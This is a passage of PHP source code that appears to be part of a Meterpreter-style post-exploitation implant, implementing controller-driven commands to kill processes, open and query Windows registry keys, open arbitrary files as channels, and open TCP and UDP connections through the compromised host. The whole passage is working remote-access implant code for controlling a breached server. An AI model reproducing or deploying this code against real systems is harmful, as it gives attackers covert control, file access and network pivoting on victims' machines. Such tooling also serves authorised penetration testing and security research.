    $pid = $pid_tlv['value'];
    if (is_callable('posix_kill')) {
        $ret = posix_kill($pid, 9);
        $ret = $ret ? ERROR_SUCCESS : posix_get_last_error();
        if ($ret != ERROR_SUCCESS) {
            my_print(posix_strerror($ret));
        }
    } else {
        $ret = ERROR_FAILURE;
        if (is_windows()) {
            my_cmd("taskkill /f /pid $pid");
            # Don't know how to check for success yet, so just assume it worked
            $ret = ERROR_SUCCESS;
        } else {
            if ("foo" == my_cmd("kill -9 $pid && echo foo")) {
                $ret = ERROR_SUCCESS;
            }
        }
    }
    return $ret;
}
}

if (!function_exists('stdapi_net_socket_tcp_shutdown')) {
register_command('stdapi_net_socket_tcp_shutdown');
function stdapi_net_socket_tcp_shutdown($req, &$pkt) {
    my_print("doing stdapi_net_socket_tcp_shutdown");
    $cid_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $c = get_channel_by_id($cid_tlv['value']);

    if ($c && $c['type'] == 'socket') {
        @socket_shutdown($c[0], $how);
        $ret = ERROR_SUCCESS;
    } else {
        $ret = ERROR_FAILURE;
    }
    return $ret;
}
}



#
# Registry
#

if (!function_exists('register_registry_key')) {
$_GLOBALS['registry_handles'] = array();

function register_registry_key($key) {
    global $registry_handles;
    $registry_handles[] = $key;
    return count($registry_handles) - 1;
}
}

if (!function_exists('deregister_registry_key')) {
function deregister_registry_key($id) {
    global $registry_handles;
    $registry_handles[$id] = null;
}
}


if (!function_exists('stdapi_registry_create_key')) {
if (is_windows() and is_callable('reg_open_key')) {
  register_command('stdapi_registry_create_key');
}
function stdapi_registry_create_key($req, &$pkt) {
    my_print("doing stdapi_registry_create_key");
    if (is_windows() and is_callable('reg_open_key')) {
        $root_tlv = packet_get_tlv($req, TLV_TYPE_ROOT_KEY);
        $base_tlv = packet_get_tlv($req, TLV_TYPE_BASE_KEY);
        $perm_tlv = packet_get_tlv($req, TLV_TYPE_PERMISSION);
        dump_array($root_tlv);
        dump_array($base_tlv);

        # For some reason the php constants for registry root keys do not have
        # the high bit set and are 1 less than the normal Windows constants, so
        # fix it here.
        $root = ($root_tlv['value'] & ~0x80000000) + 1;
        $base = $base_tlv['value'];

        my_print("reg opening '$root', '$base'");
        $key = reg_open_key($root, $base);
        if (!$key) {
            my_print("reg open failed: $key");
            return ERROR_FAILURE;
        }
        $key_id = register_registry_key($key);

        packet_add_tlv($pkt, create_tlv(TLV_TYPE_HKEY, $key_id));

        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}
}

if (!function_exists('stdapi_registry_close_key')) {
if (is_windows() and is_callable('reg_open_key')) {
    register_command('stdapi_registry_close_key');
}
function stdapi_registry_close_key($req, &$pkt) {
    if (is_windows() and is_callable('reg_open_key')) {
        global $registry_handles;
        my_print("doing stdapi_registry_close_key");
        $key_id_tlv = packet_get_tlv($req, TLV_TYPE_ROOT_KEY);
        $key_id = $key_id_tlv['value'];

        reg_close_key($registry_handles[$key_id]);
        deregister_registry_key($key_id);

        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}
}

if (!function_exists('stdapi_registry_query_value')) {
if (is_windows() and is_callable('reg_open_key')) {
  register_command('stdapi_registry_query_value');
}
function stdapi_registry_query_value($req, &$pkt) {
    if (is_windows() and is_callable('reg_open_key')) {
        global $registry_handles;
        my_print("doing stdapi_registry_query_value");
        $key_id_tlv = packet_get_tlv($req, TLV_TYPE_HKEY);
        $key_id = $key_id_tlv['value'];
        $name_tlv = packet_get_tlv($req, TLV_TYPE_VALUE_NAME);
        $name = $name_tlv['value'];

        #my_print("Looking up stored key handle $key_id");
        #dump_array($registry_handles, "Reg handles");
        $key = $registry_handles[$key_id];
        if (!$key) {
            return ERROR_FAILURE;
        }
        $data = reg_get_value($key, $name);
        my_print("Found data for $key\\$name : $data, ". is_int($data));
        # There doesn't appear to be an API to get the type, all we can do is
        # infer based on what the value looks like.  =(
        if (is_int($data)) {
            $type = REG_DWORD;
            $data = pack("N", (int)$data);
        } else {
            $type = REG_SZ;
            # The api strips the null for us, so put it back
            $data = $data ."\x00";
        }

        packet_add_tlv($pkt, create_tlv(TLV_TYPE_VALUE_DATA, $data));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_VALUE_TYPE, $type));
    } else {
        return ERROR_FAILURE;
    }
}
}

if (!function_exists('stdapi_registry_set_value')) {
if (is_windows() and is_callable('reg_open_key')) {
    register_command('stdapi_registry_set_value');
}
function stdapi_registry_set_value($req, &$pkt) {
    if (is_windows() and is_callable('reg_open_key')) {
        global $registry_handles;
        my_print("doing stdapi_registry_set_value");
        $key_id_tlv = packet_get_tlv($req, TLV_TYPE_ROOT_KEY);
        $key_id = $key_id_tlv['value'];
    } else {
        return ERROR_FAILURE;
    }
}
}


# END STDAPI



##
# Channel Helper Functions
##

if (!function_exists('channel_create_stdapi_fs_file')) {
function channel_create_stdapi_fs_file($req, &$pkt) {
    $fpath_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $mode_tlv = packet_get_tlv($req, TLV_TYPE_FILE_MODE);
    #my_print("Opening path {$fpath_tlv['value']} with mode {$mode_tlv['value']}");
    if (!$mode_tlv) {
        $mode_tlv = array('value' => 'rb');
    }
    $fd = @fopen($fpath_tlv['value'], $mode_tlv['value']);

    if (is_resource($fd)) {
        register_stream($fd);
        $id = register_channel($fd);
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
        return ERROR_SUCCESS;
    } else {
        my_print("Failed to open");
    }
    return ERROR_FAILURE;
}
}


if (!function_exists('channel_create_stdapi_net_tcp_client')) {
function channel_create_stdapi_net_tcp_client($req, &$pkt) {
    my_print("creating tcp client");

    $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
    $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);
    $local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
    $local_port_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_PORT);
    $retries_tlv = packet_get_tlv($req, TLV_TYPE_CONNECT_RETRIES);
    if ($retries_tlv['value']) {
        $retries = $retries_tlv['value'];
    } else {
        $retries = 1;
    }

    for ($i = 0; $i < $retries; $i++) {
        $sock = connect($peer_host_tlv['value'], $peer_port_tlv['value']);
        if ($sock) {
            break;
        }
    }

    if (!$sock) {
        return ERROR_CONNECTION_ERROR;
    }

    #
    # If we got here, the connection worked, respond with the new channel ID
    #

    $id = register_channel($sock);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
    add_reader($sock);
    return ERROR_SUCCESS;
}
}

if (!function_exists('channel_create_stdapi_net_udp_client')) {
function channel_create_stdapi_net_udp_client($req, &$pkt) {
    my_print("creating udp client");

    $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
    $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);

    # We can't actually do anything with local_host and local_port because PHP
    # doesn't let us specify these values in any of the exposed socket API
    # functions.
    #$local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
    #$local_port_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_PORT);

    $sock = connect($peer_host_tlv['value'], $peer_port_tlv['value'], 'udp');
    my_print("UDP channel on {$sock}");

    if (!$sock) {
        return ERROR_CONNECTION_ERROR;
    }

    #
    # If we got here, the connection worked, respond with the new channel ID
    #

    $id = register_channel($sock);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
    add_reader($sock);
    return ERROR_SUCCESS;
}
}




